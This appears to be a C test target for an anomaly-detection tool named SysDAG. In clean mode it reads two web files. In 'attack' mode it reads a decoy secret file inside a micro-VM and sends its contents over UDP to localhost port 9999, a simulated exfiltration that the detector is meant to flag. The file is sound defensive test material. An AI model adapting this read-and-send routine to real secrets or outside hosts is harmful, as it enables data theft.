/*
 * Sample target for SysDAG.
 *
 *   sysdag test.c          first run trains a baseline
 *   sysdag test.c attack   later run should look anomalous
 *
 * The micro-VM stages /guest/www (app root) and /guest/decoy/secret.txt.
 */
#define _POSIX_C_SOURCE 200809L
#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void slurp(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        return;
    }
    char buf[1024];
    while (read(fd, buf, sizeof buf) > 0) {
    }
    close(fd);
}

static void leak(const char *path) {
    char buf[1024];
    ssize_t n = 0;
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
        n = read(fd, buf, sizeof buf);
        close(fd);
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        return;
    }
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9999);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    if (n > 0) {
        sendto(s, buf, (size_t)n, 0, (struct sockaddr *)&addr, sizeof addr);
    }
    close(s);
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "clean";

    slurp("/guest/www/index.html");
    slurp("/guest/www/page.txt");

    if (strcmp(mode, "attack") == 0) {
        leak("/guest/decoy/secret.txt");
    }
    return 0;
}
